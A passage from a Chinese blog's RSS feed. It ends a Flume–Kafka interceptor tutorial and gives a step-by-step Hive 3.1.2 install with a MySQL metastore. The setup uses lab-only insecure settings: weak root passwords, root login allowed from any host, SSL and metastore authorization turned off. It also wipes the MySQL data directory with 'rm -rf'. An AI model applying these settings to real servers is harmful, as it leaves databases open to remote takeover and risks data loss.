punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Event event <span class="token operator">:</span> events<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>          <span class="token function">intercept</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> events<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">MyBuilder</span> <span class="token keyword">implements</span>  <span class="token class-name">Builder</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span>  <span class="token keyword">new</span> <span class="token class-name">FlumeKafkaInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）将写好的interceptor打包上传到Flume安装目录的lib目录下</p><p>3）配置flume</p><pre class="line-numbers language-sh"><code class="language-sh"># Name the components on this agenta1.sources = r1a1.sinks = k1a1.channels = c1# Describe/configure the sourcea1.sources.r1.type = netcata1.sources.r1.bind = 0.0.0.0a1.sources.r1.port = 6666# Describe the sinka1.sinks.k1.type = org.apache.flume.sink.kafka.KafkaSinka1.sinks.k1.kafka.topic = thirda1.sinks.k1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092a1.sinks.k1.kafka.flumeBatchSize = 20a1.sinks.k1.kafka.producer.acks = 1a1.sinks.k1.kafka.producer.linger.ms = 1#Interceptora1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = com.atguigu.kafka.flumeInterceptor.FlumeKafkaInterceptor$MyBuilder# # Use a channel which buffers events in memorya1.channels.c1.type = memorya1.channels.c1.capacity = 1000a1.channels.c1.transactionCapacity = 100# Bind the source and sink to the channela1.sources.r1.channels = c1a1.sinks.k1.channel = c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4） 启动kafka消费者</p><p>5） 进入flume根目录下，启动flume</p><pre class="line-numbers language-bash"><code class="language-bash">$ bin/flume-ng agent -c conf/ -n a1 -f jobs/flume-kafka.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6） 向6666端口写数据，查看kafka消费者消费情况</p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/kafka/">kafka</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-kafka1-setup/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（一） Hive安装</title>
      <link>https://m01ly.github.io/2020/11/14/bigdata-hive1/</link>
      <guid>https://m01ly.github.io/2020/11/14/bigdata-hive1/</guid>
      <pubDate>Sat, 14 Nov 2020 07:08:50 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前面学习到利用mapreduce去计算，但是mapreduce写起来麻烦，并且代码重复度高，可以进行封装，所以就出来了Hive，hive工具通过执行类SQL来启动写好的mapreduce,进一步执行hdfs中的资源。</p><h1 id="1-Hive是什么"><a href="#1-Hive是什么" class="headerlink" title="1 Hive是什么"></a>1 Hive是什么</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>1） hive简介</p><p>Hive：由Facebook开源用于解决海量结构化日志的数据统计工具。</p><p>Hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张表，并提供类SQL查询功能。</p><p>2） Hive本质：将HQL转化成MapReduce程序如下图所示。需要注意的是以下三点：</p><p>（1）Hive处理的数据存储在HDFS</p><p>（2）Hive分析数据底层的实现是MapReduce</p><p>（3）执行程序运行在Yarn上</p><p><img src="/2020/11/14/bigdata-hive1/1636945549117.png" alt="1636945549117"></p><h2 id="1-2-Hive架构"><a href="#1-2-Hive架构" class="headerlink" title="1.2 Hive架构"></a>1.2 Hive架构</h2><p>Hive通过给用户提供的一系列交互接口，接收到用户的指令(SQL)，使用自己的Driver，结合元数据(MetaStore)，将这些指令翻译成MapReduce，提交到Hadoop中执行，最后，将执行返回的结果输出到用户交互接口。具体架构图如下所示。</p><p><img src="/2020/11/14/bigdata-hive1/1636945658710.png" alt="1636945658710"></p><p>1）用户接口：Client</p><p>CLI（command-line interface）、JDBC/ODBC(jdbc访问hive)、WEBUI（浏览器访问hive）</p><p>2）元数据：Metastore</p><p>元数据包括：表名、表所属的数据库（默认是default）、表的拥有者、列/分区字段、表的类型（是否是外部表）、表的数据所在目录等；</p><p><strong>默认存储在自带的derby数据库中，推荐使用MySQL存储Metastore</strong></p><p>3）Hadoop</p><p><strong>使用HDFS进行存储，使用MapReduce进行计算。</strong></p><p>4）驱动器：Driver</p><p>（1）解析器（SQL Parser）：将SQL字符串转换成抽象语法树AST，这一步一般都用第三方工具库完成，比如antlr；对AST进行语法分析，比如表是否存在、字段是否存在、SQL语义是否有误。</p><p>（2）编译器（Physical Plan）：将AST编译生成逻辑执行计划。</p><p>（3）优化器（Query Optimizer）：对逻辑执行计划进行优化。</p><p>（4）执行器（Execution）：把逻辑执行计划转换成可以运行的物理计划。对于Hive来说，就是MR/Spark。</p><h1 id="2-Hive-安装"><a href="#2-Hive-安装" class="headerlink" title="2 Hive 安装"></a>2 Hive 安装</h1><h2 id="2-1-Hive安装地址"><a href="#2-1-Hive安装地址" class="headerlink" title="2.1 Hive安装地址"></a>2.1 Hive安装地址</h2><p>1）Hive官网地址</p><p><a href="http://hive.apache.org/">http://hive.apache.org/</a></p><p>2）文档查看地址</p><p><a href="https://cwiki.apache.org/confluence/display/Hive/GettingStarted">https://cwiki.apache.org/confluence/display/Hive/GettingStarted</a></p><p>3）下载地址</p><p><a href="http://archive.apache.org/dist/hive/">http://archive.apache.org/dist/hive/</a></p><p>4）github地址</p><p><a href="https://github.com/apache/hive">https://github.com/apache/hive</a></p><h2 id="2-2-MySql安装"><a href="#2-2-MySql安装" class="headerlink" title="2.2 MySql安装"></a>2.2 MySql安装</h2><p>0）为什么需要Mysql</p><p>原因在于Hive默认使用的元数据库为derby，开启Hive之后就会占用元数据库，且不与其他客户端共享数据，如果想多窗口操作就会报错，操作比较局限。以我们需要将Hive的元数据地址改为MySQL，可支持多窗口操作。</p><p>1）检查当前系统是否安装过Mysql</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ rpm -qa<span class="token operator">|</span><span class="token function">grep</span> -I -E mysql\<span class="token operator">|</span>mariadbmariadb-libs-5.5.56-2.el7.x86_64 //如果存在通过如下命令卸载<span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -e --nodeps mariadb-libs  //用此命令卸载mariadb<span class="token punctuation">[</span>molly@hadoop102 ~<span class="token punctuation">]</span>$ rpm -qa<span class="token operator">|</span><span class="token function">grep</span> -I -E mysql\<span class="token operator">|</span>mariadb <span class="token operator">|</span> <span class="token function">xargs</span> -n1 <span class="token function">sudo</span> rpm -e --nodeps<span class="token comment" spellcheck="true">#卸载所有</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2）将MySQL安装包拷贝到/opt/software目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ll</span>总用量 528384-rw-r--r--. 1 root root 609556480 3月 21 15:41 mysql-5.7.28-1.el7.x86_64.rpm-bundle.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3）解压MySQL安装包</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tar -xf mysql-5.7.28-1.el7.x86_64.rpm-bundle.tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）在安装目录下执行rpm安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-common-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-libs-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-libs-compat-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-client-5.7.28-1.el7.x86_64.rpm<span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> rpm -ivh mysql-community-server-5.7.28-1.el7.x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:按照顺序依次执行</p><p>如果Linux是最小化安装的，在安装mysql-community-server-5.7.28-1.el7.x86_64.rpm时可能会出    现如下错误</p><p>[molly@hadoop102 software]$ sudo rpm -ivh mysql-community-server-5.7.28-1.el7.x86_64.rpm</p><p>警告：mysql-community-server-5.7.28-1.el7.x86_64.rpm: 头V3 DSA/SHA1 Signature, 密钥 ID 5072e1f5: NOKEY</p><p>错误：依赖检测失败：</p><p>​    libaio.so.1()(64bit) 被 mysql-community-server-5.7.28-1.el7.x86_64 需要</p><p>​    libaio.so.1(LIBAIO_0.1)(64bit) 被 mysql-community-server-5.7.28-1.el7.x86_64 需要</p><p>​    libaio.so.1(LIBAIO_0.4)(64bit) 被 mysql-community-server-5.7.28-1.el7.x86_64 需要</p><p>通过yum安装缺少的依赖,然后重新安装mysql-community-server-5.7.28-1.el7.x86_64 即可</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span> yum <span class="token function">install</span> -y libaio<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）删除/etc/my.cnf文件中datadir指向的目录下的所有内容,如果有内容的情况下:</p><p>  查看datadir的值：</p><p>[mysqld]</p><p>datadir=/var/lib/mysql</p><p>  删除/var/lib/mysql目录下的所有内容:</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mysql<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /var/lib/mysql</span><span class="token punctuation">[</span>molly@hadoop102 mysql<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo rm -rf ./*  //注意执行命令的位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6）初始化数据库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">sudo</span> mysqld --initialize --user<span class="token operator">=</span>mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）查看临时生成的root用户的密码 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">cat</span> /var/log/mysqld.log <span class="token operator">|</span><span class="token function">grep</span> password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）启动MySQL服务</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ <span class="token function">sudo</span> systemctl start mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9）登录MySQL数据库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 opt<span class="token punctuation">]</span>$ mysql -uroot -pEnter password:  输入临时生成的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  登录成功.</p><p>10）必须先修改root用户的密码,否则执行其他的操作会报错</p><pre class="line-numbers language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">set</span> password <span class="token operator">=</span> password<span class="token punctuation">(</span><span class="token string">"000000"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>11）修改mysql库下的user表中的root用户允许任意ip连接</p><pre class="line-numbers language-bash"><code class="language-bash">mysql<span class="token operator">></span> update mysql.user <span class="token keyword">set</span> host<span class="token operator">=</span><span class="token string">'%'</span> where user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">;</span>mysql<span class="token operator">></span> flush privileges<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-3-Hive安装部署"><a href="#2-3-Hive安装部署" class="headerlink" title="2.3 Hive安装部署"></a>2.3 Hive安装部署</h2><p>1）把apache-hive-3.1.2-bin.tar.gz上传到linux的/opt/software目录下</p><p>2）解压apache-hive-3.1.2-bin.tar.gz到/opt/module/目录下面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">tar</span> -zxvf /opt/software/apache-hive-3.1.2-bin.tar.gz -C /opt/module/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）修改apache-hive-3.1.2-bin.tar.gz的名称为hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">mv</span> /opt/module/apache-hive-3.1.2-bin/ /opt/module/hive-3.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）修改/etc/profile.d/my_env.sh，添加环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">sudo</span> vim /etc/profile.d/my_env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5）添加内容</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#HIVE_HOME</span>HIVE_HOME<span class="token operator">=</span>/opt/module/hive-3.1.2PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$JAVA_HOME</span>/bin:<span class="token variable">$HADOOP_HOME</span>/bin:<span class="token variable">$HADOOP_HOME</span>/sbin:<span class="token variable">$HIVE_HOME</span>/bin<span class="token function">export</span> PATH JAVA_HOME HADOOP_HOME HIVE_HOME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6）解决日志Jar包冲突:Hive日志与Hadoop默认日志冲突，可以直接删除hive日志JAR</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">rm</span> -rf /opt/module/hive-3.1.2/lib/log4j-slf4j-impl-2.10.0.jar <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-4-Hive元数据配置到MySql"><a href="#2-4-Hive元数据配置到MySql" class="headerlink" title="2.4 Hive元数据配置到MySql"></a>2.4 Hive元数据配置到MySql</h2><p>因为Hive默认使用的元数据库为derby，为了想多窗口操作，我们需要将Hive的元数据地址改为MySQL。下面安装好mysql后，进行将Hive元数据配置到mysql上。其中HIVE_HOME=/opt/module/hive-3.1.2</p><h3 id="2-4-1-拷贝驱动"><a href="#2-4-1-拷贝驱动" class="headerlink" title="2.4.1 拷贝驱动"></a>2.4.1 拷贝驱动</h3><p>将MySQL的JDBC驱动拷贝到Hive的lib目录下</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ <span class="token function">cp</span> /opt/software/mysql-connector-java-5.1.48.jar <span class="token variable">$HIVE_HOME</span>/lib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-4-2-配置Metastore到MySql"><a href="#2-4-2-配置Metastore到MySql" class="headerlink" title="2.4.2 配置Metastore到MySql"></a>2.4.2 配置Metastore到MySql</h3><p>在$HIVE_HOME/conf目录下新建hive-site.xml文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ vim <span class="token variable">$HIVE_HOME</span>/conf/hive-site.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加如下内容</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span><span class="token prolog">&lt;?xml-stylesheet type="text/xsl" href="configuration.xsl"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的URL --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionURL<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>jdbc:mysql://hadoop102:3306/metastore?useSSL=false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的Driver--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionDriverName<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>com.mysql.jdbc.Driver<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的username--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionUserName<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- jdbc连接的password --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>javax.jdo.option.ConnectionPassword<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- Hive默认在HDFS的工作目录 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.warehouse.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>/user/hive/warehouse<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- Hive元数据存储的验证 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.schema.verification<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>  <span class="token comment" spellcheck="true">&lt;!-- 元数据存储授权 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.event.db.notification.api.auth<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-5-启动Hive"><a href="#2-5-启动Hive" class="headerlink" title="2.5 启动Hive"></a>2.5 启动Hive</h2><h3 id="2-5-1-初始化元数据库"><a href="#2-5-1-初始化元数据库" class="headerlink" title="2.5.1 初始化元数据库"></a>2.5.1 初始化元数据库</h3><p>1）登陆MySQL</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ mysql -uroot -p000000<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）新建Hive元数据库</p><pre class="line-numbers language-bash"><code class="language-bash">mysql<span class="token operator">></span> create database metastore<span class="token punctuation">;</span>mysql<span class="token operator">></span> quit<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>3）初始化Hive元数据库</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 software<span class="token punctuation">]</span>$ schematool -initSchema -dbType mysql -verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-5-2-启动Hive"><a href="#2-5-2-启动Hive" class="headerlink" title="2.5.2 启动Hive"></a>2.5.2 启动Hive</h3><p>0）先启动hadoop集群</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ start-dfs.sh<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ start-yarn.sh<span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ myjps.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 浏览器中查看hdfs：<a href="http://hadoop102:9870/">http://Hadoop102:9870</a></p><p>浏览器中查看yarn ：<a href="http://hadoop103:8088/">http://Hadoop103:8088</a></p><p>1）启动Hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 hive<span class="token punctuation">]</span>$ bin/hive<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）使用Hive</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> show databases<span class="token punctuation">;</span>hive<span class="token operator">></span> show tables<span class="token punctuation">;</span>hive<span class="token operator">></span> create table <span class="token function">test</span> <span class="token punctuation">(</span>id int<span class="token punctuation">)</span><span class="token punctuation">;</span>hive<span class="token operator">></span> insert into <span class="token function">test</span> values<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>hive<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">test</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-5-3-使用元数据服务的方式访问Hive"><a href="#2-5-3-使用元数据服务的方式访问Hive" class="headerlink" title="2.5.3 使用元数据服务的方式访问Hive"></a>2.5.3 使用元数据服务的方式访问Hive</h3><p>原始方法：Hive直接访问mysql</p><p><strong>使用元数据服务方式：Hive—》元数据服务，元数据服务—》访问mysql。</strong></p><p>1）在hive-site.xml文件中添加如下配置信息</p><pre class="line-numbers language-xml"><code class="language-xml">  <span class="token comment" spellcheck="true">&lt;!-- 指定存储元数据要连接的地址 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.metastore.uris<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>​    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>thrift://hadoop102:9083<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）启动metastore</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop202 hive<span class="token punctuation">]</span>$ hive --service metastore2020-04-24 16:58:08: Starting Hive Metastore Server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意: 启动后窗口不能再操作，需打开一个新的shell窗口做别的操作</p><p>3）启动 hive</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop202 hive<span class="token punctuation">]</span>$ bin/hive<span aria-hidden="true" 